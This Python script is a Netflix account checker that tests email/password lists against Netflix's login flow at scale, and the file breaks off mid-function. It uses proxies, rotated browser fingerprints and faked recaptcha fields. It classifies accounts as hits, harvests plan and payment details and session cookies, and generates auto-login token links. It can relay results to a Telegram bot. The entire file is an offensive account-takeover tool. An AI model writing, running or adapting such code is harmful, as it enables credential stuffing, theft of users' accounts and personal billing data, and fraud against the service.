#!/usr/bin/env python3

import sys, os, json, re, uuid, random, string, urllib.parse
import threading, queue, time
from datetime import datetime
from collections import deque, defaultdict

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as creq
    CURL_OK = True
except ImportError:
    import requests as creq
    CURL_OK = False

import requests as _std_requests

GRAPHQL_URL  = "https://www.netflix.com/graphql"
PERSISTED_ID = "6787cd3c-511a-455e-8aa8-8b44cd8cf453"
PQ_VERSION   = 102
MAX_RETRY    = 4
MAX_OUTER    = 6
TIMEOUT_GQL  = 35
TIMEOUT_PAGE = 45
TIMEOUT_INFO = 25
TAG          = "@baron_saplar"

LANG_MAP = {
    'BR':'pt','PT':'pt','AO':'pt','MZ':'pt',
    'US':'en','GB':'en','AU':'en','CA':'en','IE':'en','NZ':'en','ZA':'en',
    'TR':'tr','DE':'de','FR':'fr','ES':'es','IT':'it','JP':'ja','KR':'ko',
    'CN':'zh','RU':'ru','PL':'pl','NL':'nl','SE':'sv','NO':'no','DK':'da',
    'FI':'fi','MX':'es','AR':'es','CO':'es','PE':'es','CL':'es','VE':'es',
    'PA':'es','EC':'es','UY':'es','PY':'es','BO':'es',
    'IN':'hi','PK':'ur','BD':'bn','TH':'th','VN':'vi','ID':'id','MY':'ms',
    'SA':'ar','AE':'ar','EG':'ar','MA':'ar','DZ':'ar','TN':'ar',
    'IL':'he','GR':'el','HU':'hu','CZ':'cs','SK':'sk','RO':'ro',
    'HR':'hr','RS':'sr','BG':'bg','UA':'uk','KZ':'kk',
    'NG':'en','KE':'en','GH':'en','TZ':'en','SN':'fr','CM':'fr',
    'AT':'de','CH':'de','BE':'nl','PH':'en','SG':'en','HK':'zh',
    'TW':'zh','CI':'fr','LB':'ar','JO':'ar','IQ':'ar','LY':'ar',
    'SD':'ar','PS':'ar','OM':'ar','BH':'ar','QA':'ar','KW':'ar',
    'LI':'de','LU':'fr','MC':'fr','IE':'en','IS':'en','MT':'en',
    'CY':'el','EE':'et','LV':'lv','LT':'lt','SI':'sl','HR':'hr',
    'BA':'bs','ME':'sr','MK':'mk','AL':'sq','XK':'sq',
}

PHONE_CODES = {
    "AF":"93","AL":"355","DZ":"213","AR":"54","AM":"374","AU":"61","AT":"43",
    "AZ":"994","BH":"973","BD":"880","BE":"32","BR":"55","BN":"673","BG":"359",
    "KH":"855","CM":"237","CA":"1","CL":"56","CN":"86","CO":"57","HR":"385",
    "CZ":"420","DK":"45","EG":"20","EE":"372","FI":"358","FR":"33","GE":"995",
    "DE":"49","GH":"233","GR":"30","HU":"36","IN":"91","ID":"62","IR":"98",
    "IQ":"964","IE":"353","IL":"972","IT":"39","JP":"81","JO":"962","KZ":"7",
    "KE":"254","KR":"82","KW":"965","LB":"961","LV":"371","LT":"370","MY":"60",
    "MX":"52","MA":"212","NL":"31","NZ":"64","NG":"234","NO":"47","PK":"92",
    "PA":"507","PE":"51","PH":"63","PL":"48","PT":"351","QA":"974","RO":"40",
    "RU":"7","SA":"966","SN":"221","RS":"381","SG":"65","SK":"421","SI":"386",
    "ZA":"27","ES":"34","LK":"94","SE":"46","CH":"41","SY":"963","TW":"886",
    "TZ":"255","TH":"66","TN":"216","TR":"90","UA":"380","AE":"971","GB":"44",
    "US":"1","UY":"598","UZ":"998","VE":"58","VN":"84","CI":"225",
    "LI":"423","LU":"352","MC":"377","MT":"356","CY":"357","IS":"354",
    "BA":"387","ME":"382","MK":"389","XK":"383",
}

_CHROME = [
    {"ua":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36",
     "sec":  '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "full": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "pf":   "chrome136", "plat": '"Windows"', "mobile": "?0"},
    {"ua":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36",
     "sec":  '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "full": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "pf":   "chrome136", "plat": '"macOS"', "mobile": "?0"},
    {"ua":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
     "sec":  '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "full": '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "pf":   "chrome136", "plat": '"Windows"', "mobile": "?0"},
    {"ua":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
     "sec":  '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
     "full": '"Google Chrome";v="141.0.7390.55", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.55"',
     "pf":   "chrome136", "plat": '"Windows"', "mobile": "?0"},
    {"ua":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
     "sec":  '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
     "full": '"Google Chrome";v="141.0.7390.55", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.55"',
     "pf":   "chrome136", "plat": '"macOS"', "mobile": "?0"},
    {"ua":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
     "sec":  '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "full": '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "pf":   "chrome136", "plat": '"Linux"', "mobile": "?0"},
]


def _pick():
    return random.choice(_CHROME)


def _flag(cc):
    if not cc or len(cc) < 2:
        return ''
    return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc.upper()[:2])


G, R, Y, B, C, M, DIM, BD, RS = (
    '\033[92m', '\033[91m', '\033[93m', '\033[94m',
    '\033[96m', '\033[95m', '\033[90m', '\033[1m', '\033[0m')

COL = {'HIT': G, 'BAD': R, 'FREE': Y}


class Stats:
    def __init__(self, total):
        self._lk = threading.Lock()
        self.total = total
        self.done = self.hit = self.bad = self.free = self.retry = 0
        self._ts = deque(maxlen=500)
        self.t0 = time.time()

    def add(self, k):
        with self._lk:
            self.done += 1
            setattr(self, k, getattr(self, k, 0) + 1)
            self._ts.append(time.time())

    def add_retry(self):
        with self._lk:
            self.retry += 1

    @property
    def cpm(self):
        now = time.time()
        with self._lk:
            return sum(1 for t in self._ts if now - t <= 60)

    @property
    def elapsed(self):
        s = int(time.time() - self.t0)
        return f"{s // 60:02d}:{s % 60:02d}"


_fl = threading.Lock()
_pl = threading.Lock()


def _save(path, line):
    with _fl:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line + '\n')


def _log(kind, msg):
    ts = datetime.now().strftime('%H:%M:%S')
    with _pl:
        sys.stdout.write(f"\r{' ' * 200}\r")
        sys.stdout.write(f"[{DIM}{ts}{RS}] {BD}{COL.get(kind, '')}{kind:<5}{RS}  {msg}\n")
        sys.stdout.flush()


def _bar(s):
    W = 34
    pct = s.done / s.total if s.total else 0
    fill = int(W * pct)
    bar = f"{G}{chr(9608) * fill}{DIM}{chr(9617) * (W - fill)}{RS}"
    rt = f" {DIM}R:{s.retry}{RS}" if s.retry else ""
    line = (f"\r {bar} {BD}{s.done}/{s.total}{RS} {DIM}{pct * 100:5.1f}%{RS} | "
            f"{G}HIT:{BD}{s.hit}{RS} "
            f"{R}BAD:{s.bad}{RS} "
            f"{Y}FREE:{s.free}{RS} "
            f"| {C}CPM:{BD}{s.cpm}{RS} | {DIM}{s.elapsed}{RS}{rt}  ")
    with _pl:
        sys.stdout.write(line)
        sys.stdout.flush()


def _tg(token, chat, text, buttons=None):
    if not token or not chat:
        return
    try:
        payload = {'chat_id': chat, 'text': text, 'parse_mode': 'HTML',
                   'disable_web_page_preview': 'true'}
        if buttons:
            payload['reply_markup'] = json.dumps({"inline_keyboard": buttons})
        _std_requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                           data=payload, timeout=10)
    except Exception:
        pass


def _between(t, l, r):
    i = t.find(l)
    if i < 0:
        return None
    i += len(l)
    j = t.find(r, i)
    return t[i:j] if j >= 0 else None


def _unes(s):
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    return s


def _tokens(html, url):
    ss = su = None
    if 'serverState=' in url:
        qs = urllib.parse.urlparse(url).query
        ss = urllib.parse.parse_qs(qs).get('serverState', [None])[0]
    if not ss:
        for pat in ['"serverState":"', 'serverState%22%3A%22',
                    '"serverState" : "', 'serverState\\":\\"']:
            v = _between(html, pat, '"')
            if v and len(v) > 20 and not v.startswith('{'):
                ss = _unes(v)
                break
    if not ss:
        m = re.search(r'serverState["\s:%]+([A-Za-z0-9+/=_\-]{30,})', html)
        if m:
            ss = m.group(1)
    v = _between(html, '"serverScreenUpdate":"', '"')
    if v and len(v) > 20:
        su = _unes(v)
    m = re.search(r'uiVersion["\s:]+["\']?(v[a-f0-9]{6,})', html)
    av = m.group(1) if m else 'v647f4d35'
    return ss, su, av


def _nstate(t):
    try:
        return json.loads(t).get('data', {}).get('result', {}).get('screen', {}).get('serverState')
    except Exception:
        return None


def _subcmds(t):
    out = []

    def w(o, d=0):
        if d > 20:
            return
        if isinstance(o, dict):
            if (o.get('__typename') == 'CLCSRequestScreenUpdate'
                    and o.get('loggingCommand') == 'SubmitCommand'
                    and o.get('serverScreenUpdate')):
                out.append(o['serverScreenUpdate'])
            for v in o.values():
                w(v, d + 1)
        elif isinstance(o, list):
            for i in o:
                w(i, d + 1)

    try:
        w(json.loads(t))
    except Exception:
        pass
    return out


def _tids(t):
    r = set()

    def w(o, d=0):
        if d > 20:
            return
        if isinstance(o, dict):
            tid = o.get('testId')
            if tid:
                r.add(tid)
            for v in o.values():
                w(v, d + 1)
        elif isinstance(o, list):
            for i in o:
                w(i, d + 1)

    try:
        w(json.loads(t))
    except Exception:
        pass
    return r


def _texts(t):
    r = []

    def w(o, d=0):
        if d > 20:
            return
        if isinstance(o, dict):
            pc = o.get('plainContent')
            if isinstance(pc, dict) and pc.get('value'):
                r.append(pc['value'])
            wt = o.get('webTextWithTags')
            if isinstance(wt, dict):
                tx = wt.get('text') or {}
                if isinstance(tx, dict) and tx.get('value'):
                    r.append(tx['value'])
            for v in o.values():
                w(v, d + 1)
        elif isinstance(o, list):
            for i in o:
                w(i, d + 1)

    try:
        w(json.loads(t))
    except Exception:
        pass
    return r


_NEVER_TIDS = frozenset({
    'registration-consent', 'email-consent', 'name-input',
    'signupform', 'sign-up', 'field-firstName', 'continue-reg'})

_FREE_TIDS = frozenset({
    'plan-context-page-container', 'signupContextContainer', 'plan-selection-title'})

_FREE_KW = (
    'choose your plan', 'choose a plan', 'pick a plan',
    'rejoin', 'restart netflix', 'reactivat',
    'resume your membership', 'come back to netflix',
    'restart your membership', 'sent a rejoin link')

_OTP_TIDS = frozenset({
    'collect-otp', 'pin-entry', 'resend-code-text',
    'authentication-link-sent', 'magic-link',
    'account-mfa-button-OTP_SMS', 'account-select-mfa-factor',
    'account-mfa-button-OTP_EMAIL', 'mfa-challenge'})

_OTP_KW = (
    'link sent', 'code sent', 'check your email',
    'check your inbox', 'enviamos um', 'we sent',
    'we emailed', 'authentication link',
    'kodu girin', 'kod gonderdik',)

_LOGIN_OK = (
    'circle-checkmark', 'navigating to /browse', 'universal":"/browse',
    'authflow-post-login', 'profile-gate', 'whoIsWatching',
    'who-is-watching', 'manage-profiles', '"ProfilesGate"',
    'switchProfile', 'prefetch":"/browse', '"path":"/browse')

_BAD_KW = (
    'incorrect password', 'wrong password', 'invalid password',
    'password is incorrect', 'incorrect email or password',
    'email or password you entered is incorrect',
    'senha incorreta', 'senha inv',
    'sifre hatali', 'hatali sifre', 'yanlis sifre', 'gecersiz sifre',
    'parola yanlis', 'yanlis parola',
    'ifre hatal', 'ifre yanl', 'arola yanl',
    'falsches passwort', 'passwort falsch',
    'mot de passe incorrect',
    'contrasena incorrecta', 'password errata',
    'parola errata', 'wachtwoord onjuist')

_TRANSIENT = (
    'something went wrong', 'please try again in a few minutes',
    'try again later', 'service is temporarily unavailable',
    'unexpected error', 'an error has occurred', 'server error',
    'bir sorun olu', 'dakika sonra', 'tekrar deneyin', 'yeniden deneyin',
    'erro inesperado', 'tente novamente',
    'ein fehler ist aufgetreten', 'une erreur',
    'se ha producido un error', 'intente de nuevo')

_NET_ERR = (
    'recv failure', 'connection was reset', 'connection reset',
    'connection refused', 'failed to perform', 'curl: (56)',
    'curl: (7)', 'curl: (28)', 'proxy', 'timed out', 'timeout',
    'ssl', 'eof', 'broken pipe', 'network', 'socksconnect',
    'could not resolve', 'no route', 'unreachable')


def _session(proxy_url=None, pf="chrome136"):
    sess = creq.Session(impersonate=pf) if CURL_OK else creq.Session()
    if proxy_url:
        sess.proxies = {'http': proxy_url, 'https': proxy_url}
    return sess


def _gql(sess, ss, su, fields, av, country, lowcode, ch, step='identification'):
    ua, sec, plat = ch['ua'], ch['sec'], ch['plat']
    full = ch.get('full', sec)
    mob = ch.get('mobile', '?0')
    lang = LANG_MAP.get(country.upper(), 'en')
    loc = f'{lang}-{country.upper()}'
    ctx = json.dumps({"appView": step, "action": "Submitted", "appstate": "foreground"})
    h = {
        'x-netflix.request.id':              ''.join(random.choices(string.hexdigits[:16], k=32)),
        'x-netflix.context.operation-name':   'CLCSScreenUpdate',
        'x-netflix.request.originating.url':  f'https://www.netflix.com/{lowcode}/login',
        'x-netflix.context.app-version':      av,
        'x-netflix.context.hawkins-version':  '5.29.0',
        'x-netflix.request.clcs.bucket':      'high',
        'x-netflix.context.locales':          loc.lower(),
        'x-netflix.context.ui-flavor':        'akira',
        'x-netflix.request.toplevel.uuid':    str(uuid.uuid4()),
        'x-netflix.request.attempt':          '1',
        'x-netflix.request.client.context':   ctx,
        'accept':                     '*/*',
        'content-type':               'application/json',
        'accept-language':            loc.lower(),
        'user-agent':                 ua,
        'origin':                     'https://www.netflix.com',
        'referer':                    f'https://www.netflix.com/{lowcode}/login',
        'sec-fetch-site':             'same-origin',
        'sec-fetch-mode':             'cors',
        'sec-fetch-dest':             'empty',
        'sec-ch-ua':                  sec,
        'sec-ch-ua-mobile':           mob,
        'sec-ch-ua-platform':         plat,
        'sec-ch-ua-model':            '""',
        'sec-ch-ua-platform-version': '"19.0.0"' if 'Windows' in plat else '"14.6.0"',
        'accept-encoding':            'gzip, deflate, br, zstd',
        'priority':                   'u=1, i',
    }
    body = {
        "operationName": "CLCSScreenUpdate",
        "variables": {
            "format": "HTML", "imageFormat": "PNG", "locale": loc,
            "serverState": ss, "serverScreenUpdate": su or "",
            "inputFields": fields,
        },
        "extensions": {"persistedQuery": {"id": PERSISTED_ID, "version": PQ_VERSION}}
    }
    resp = sess.post(GRAPHQL_URL, headers=h, json=body, timeout=TIMEOUT_GQL)
    if resp.status_code == 429:
        raise ConnectionError("rate-limited (429)")
    return resp.text


def _extract_cookies(sess):
    try:
        return '; '.join(f'{k}={v}' for k, v in sess.cookies.items())
    except Exception:
        return ''


def _get_netflix_id(cookie_str):
    for part in cookie_str.split(';'):
        part = part.strip()
        if part.startswith('NetflixId='):
            return part[len('NetflixId='):]
    return ''


_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {
    "appVersion": "15.48.1",
    "config": ('{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false",'
               '"cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true",'
               '"billboardEnabled":"true","sharksEnabled":"true",'
               '"useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}'),
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
_IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def _generate_nftoken(netflix_id_raw, proxy_url=None, timeout=15):
    if not netflix_id_raw:
        return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    headers = dict(_IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = _std_requests.get(
            _IOS_API, params=_IOS_PARAMS, headers=headers,
            proxies=proxies, timeout=timeout, verify=False)
        if r.status_code == 200:
            tok = (((r.json().get("value") or {}).get("account") or {})
                   .get("token") or {}).get("default") or {}
            if tok.get("token"):
                return str(tok["token"])
    except Exception:
        pass

    try:
        sess2 = _std_requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        if proxies:
            sess2.proxies = proxies
            sess2.verify = False
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {"persistedQuery": {"version": 102,
                                              "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
        }
        r2 = sess2.post(
            "https://android13.prod.ftl.netflix.com/graphql",
            json=payload,
            headers={"User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 13)",
                     "Accept": "application/json", "Content-Type": "application/json"},
            timeout=timeout)
        if r2.status_code == 200:
            tok = (r2.json().get("data") or {}).get("createAutoLoginToken")
            if tok:
                return str(tok)
    except Exception:
        pass
    return None


def _make_login_links(nftoken):
    if not nftoken:
        return None, None, None
    tok_safe = urllib.parse.quote(nftoken, safe="")
    login_pc = f"https://netflix.com/?nftoken={tok_safe}"
    login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
    login_tv = "https://www.netflix.com/tv2"
    return login_pc, login_phone, login_tv


def _verify_account(sess, ua, country):
    lang = LANG_MAP.get(country.upper(), 'en')
    loc = f'{lang}-{country.upper()}'
    info = {}
    try:
        r = sess.get('https://www.netflix.com/youraccount', headers={
            'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language':           f'{loc},{lang};q=0.9,en;q=0.8',
            'accept-encoding':           'gzip, deflate, br, zstd',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest':            'document',
            'sec-fetch-mode':            'navigate',
            'sec-fetch-site':            'same-origin',
            'user-agent':                ua,
        }, timeout=TIMEOUT_INFO)
        html = r.text
    except Exception:
        return None

    for key, left, right in [
        ('Plan',       '"localizedPlanName":{"fieldType":"String","value":"', '"'),
        ('Country',    '"currentCountry":"',                                  '"'),
        ('MaxStreams', '"maxStreams":{"fieldType":"Numeric","value":',         '},'),
        ('NextBill',   '"nextBillingDate":{"fieldType":"String","value":"',   '"'),
        ('Payment',    '"paymentMethod":{"fieldType":"String","value":"',     '"'),
        ('Since',      '"memberSince":"',                                     '",'),
        ('Quality',    '"videoQuality":{"fieldType":"String","value":"',      '"'),
    ]:
        v = _between(html, left, right)
        if v:
            info[key] = _unes(v.strip())

    m = re.search(r'"numProfiles"\s*:\s*(\d+)', html)
    if m:
        info['Profiles'] = m.group(1)
    m = re.search(r'"extraMemberCount"\s*:\s*(\d+)', html)
    if m and m.group(1) != '0':
        info['Extra'] = m.group(1)
    m = re.search(r'"isAdPlan"\s*:\s*(true)', html)
    if m:
        info['Ads'] = 'Yes'

    has_plan = bool(info.get('Plan'))
    has_bill = bool(info.get('NextBill'))
    info['_active'] = has_plan and has_bill

    if not info.get('_active'):
        if 'planselection' in html.lower() or 'choose your plan' in html.lower():
            info['_active'] = False
        if '"isMember":false' in html or '"currentMemberStatus":"FORMER_MEMBER"' in html:
            info['_active'] = False
        if '"currentMemberStatus":"CURRENT_MEMBER"' in html:
            info['_active'] = True

    return info


def _fmt_capture(info, country, cookies='', login_pc=None):
    parts = []
    cc = info.get('Country', country)
    fl = _flag(cc)
    order = ['Plan', 'Country', 'MaxStreams', 'Quality', 'NextBill',
             'Payment', 'Since', 'Profiles', 'Extra', 'Ads']
    for k in order:
        v = info.get(k)
        if not v:
            continue
        if k == 'Country':
            parts.append(f"Country = {v} {fl}")
        else:
            parts.append(f"{k} = {v}")
    if login_pc:
        parts.append(f"LoginLink = {login_pc}")
    if cookies:
        parts.append(f"Cookies = {cookies}")
    parts.append(f"ConfigBy = {TAG}")
    return ' | '.join(parts)


def _has_pw(tids):
    return 'password-input' in tids or 'field-password' in tids


def _has_submit(tids):
    return 'sign-in-button' in tids or 'continue-button' in tids


def _check(email, password, proxy_url, country, lowcode, cc, pool=None):
    ch = _pick()
    ua, sec, pf, plat = ch['ua'], ch['sec'], ch['pf'], ch['plat']
    full = ch.get('full', sec)
    mob = ch.get('mobile', '?0')
    lang = LANG_MAP.get(country.upper(), 'en')
    net_only = True

    for attempt in range(MAX_RETRY):
        try:
            sess = _session(proxy_url, pf)

            loc_hdr = f'{lang}-{country}'
            page = sess.get(f'https://www.netflix.com/{lowcode}/login', headers={
                'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language':           loc_hdr.lower(),
                'accept-encoding':           'gzip, deflate, br, zstd',
                'upgrade-insecure-requests': '1',
                'sec-fetch-site':            'none',
                'sec-fetch-mode':            'navigate',
                'sec-fetch-dest':            'document',
                'sec-fetch-user':            '?1',
                'sec-ch-ua':                 sec,
                'sec-ch-ua-mobile':          mob,
                'sec-ch-ua-platform':        plat,
                'sec-ch-ua-model':           '""',
                'sec-ch-ua-platform-version': '"19.0.0"' if 'Windows' in plat else '"14.6.0"',
                'user-agent':                ua,
                'priority':                  'u=0, i',
            }, timeout=TIMEOUT_PAGE, allow_redirects=True)

            ss, su, av = _tokens(page.text, page.url)
            if not ss:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 4))
                    continue
                return 'RETRY', '', '', None

            net_only = False

            r1 = _gql(sess, ss, su or '', [
                {"name": "userLoginId",          "value": {"stringValue": email}},
                {"name": "countryCode",          "value": {"stringValue": cc}},
                {"name": "countryIsoCode",       "value": {"stringValue": country}},
                {"name": "recaptchaResponseTime","value": {"intValue": random.randint(400, 1200)}},
                {"name": "recaptchaError",       "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
            ], av, country, lowcode, ch, step='identification')

            ns1   = _nstate(r1)
            cmds1 = _subcmds(r1)
            tids1 = _tids(r1)
            txts1 = ' '.join(_texts(r1)).lower()

            if not ns1:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 4))
                    continue
                return 'RETRY', '', '', None

            if tids1 & _NEVER_TIDS:
                return 'BAD', '', '', None

            if (tids1 & _FREE_TIDS) or any(k in txts1 for k in _FREE_KW):
                return 'FREE', f'Former Member | ConfigBy = {TAG}', '', None

            is_otp = bool(tids1 & _OTP_TIDS) or any(k in txts1 for k in _OTP_KW)
            has_pw_fallback = 'usePasswordInsteadHelpMenuItem' in tids1 or 'help-menu-item-0' in tids1 or 'help-menu-item-1' in tids1
            if is_otp and not has_pw_fallback:
                return 'BAD', '', '', None

            pw_state, pw_cmds = ns1, cmds1
            if not _has_pw(tids1):
                pw_su = cmds1[-1] if cmds1 else ''
                r1b    = _gql(sess, ns1, pw_su, [], av, country, lowcode, ch, step='collectOtp')
                ns1b   = _nstate(r1b)
                cmds1b = _subcmds(r1b)
                tids1b = _tids(r1b)

                if ns1b and _has_pw(tids1b):
                    pw_state, pw_cmds = ns1b, cmds1b
                elif ns1b:
                    if bool(tids1b & _OTP_TIDS) or any(k in ' '.join(_texts(r1b)).lower() for k in _OTP_KW):
                        return 'BAD', '', '', None
                    pw_state, pw_cmds = ns1b, cmds1b
                else:
                    if is_otp:
                        return 'BAD', '', '', None
                    txts1b_low = ' '.join(_texts(r1b)).lower()
                    if any(kw in txts1b_low for kw in _TRANSIENT):
                        if attempt < MAX_RETRY - 1:
                            time.sleep(random.uniform(3, 7))
                            continue
                        return 'RETRY', '', '', None

            pw_su2 = pw_cmds[1] if len(pw_cmds) > 1 else (pw_cmds[0] if pw_cmds else '')
            r2 = _gql(sess, pw_state, pw_su2, [
                {"name": "password",             "value": {"stringValue": password}},
                {"name": "userLoginId",          "value": {"stringValue": email}},
                {"name": "countryCode",          "value": {"stringValue": cc}},
                {"name": "countryIsoCode",       "value": {"stringValue": country}},
                {"name": "recaptchaResponseTime","value": {"intValue": random.randint(200, 600)}},
                {"name": "recaptchaError",       "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
            ], av, country, lowcode, ch, step='passwordLogin')

            low2  = r2.lower()
            tids2 = _tids(r2)
            txts2 = ' '.join(_texts(r2)).lower()

            if (tids2 & _OTP_TIDS) or any(k in txts2 for k in _OTP_KW):
                if not (_has_pw(tids2) and _has_submit(tids2)):
                    return 'BAD', '', '', None

            login_ok = any(sig in r2 or sig in low2 for sig in _LOGIN_OK)
            if login_ok:
                cookies = _extract_cookies(sess)
                nf_id = _get_netflix_id(cookies)
                nftoken = _generate_nftoken(nf_id, proxy_url, timeout=15) if nf_id else None
                login_pc, login_phone, login_tv = _make_login_links(nftoken)
                links = {'pc': login_pc, 'phone': login_phone, 'tv': login_tv} if nftoken else None
                info = None
                for _vt in range(3):
                    info = _verify_account(sess, ua, country)
                    if info is not None:
                        break
                    time.sleep(random.uniform(1, 2.5))
                if info and info.get('_active'):
                    capture = _fmt_capture(info, country, cookies, login_pc)
                    return 'HIT', capture, cookies, links
                elif info is not None:
                    cc_val = info.get('Country', country)
                    fl = _flag(cc_val)
                    parts = ['Status = Former Member']
                    if info.get('Country'):
                        parts.append(f"Country = {info['Country']} {fl}")
                    if info.get('Since'):
                        parts.append(f"Since = {info['Since']}")
                    if info.get('Plan'):
                        parts.append(f"Plan = {info['Plan']}")
                    if cookies:
                        parts.append(f"Cookies = {cookies}")
                    parts.append(f"ConfigBy = {TAG}")
                    return 'FREE', ' | '.join(parts), cookies, None
                else:
                    ck_part = f" | Cookies = {cookies}" if cookies else ""
                    lk_part = f" | LoginLink = {login_pc}" if login_pc else ""
                    return 'HIT', f'Login OK{lk_part}{ck_part} | ConfigBy = {TAG}', cookies, links

            if any(kw in txts2 for kw in _TRANSIENT):
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(3, 7))
                    continue
                return 'RETRY', '', '', None

            if (tids2 & _FREE_TIDS) or any(kw in txts2 for kw in _FREE_KW):
                cookies = _extract_cookies(sess)
                ck_part = f" | Cookies = {cookies}" if cookies else ""
                return 'FREE', f'Former Member{ck_part} | ConfigBy = {TAG}', cookies, None

            if tids2 & _NEVER_TIDS:
                return 'BAD', '', '', None

            if any(kw in low2 or kw in txts2 for kw in _BAD_KW):
                return 'BAD', '', '', None
            if _has_pw(tids2) and _has_submit(tids2):
                if not any(kw in txts2 for kw in _TRANSIENT):
                    return 'BAD', '', '', None

            if attempt < MAX_RETRY - 1:
                time.sleep(random.uniform(2, 5) * (attempt + 1))
                continue
            return 'RETRY', '', '', None

        except Exception as exc:
            err = str(exc).lower()
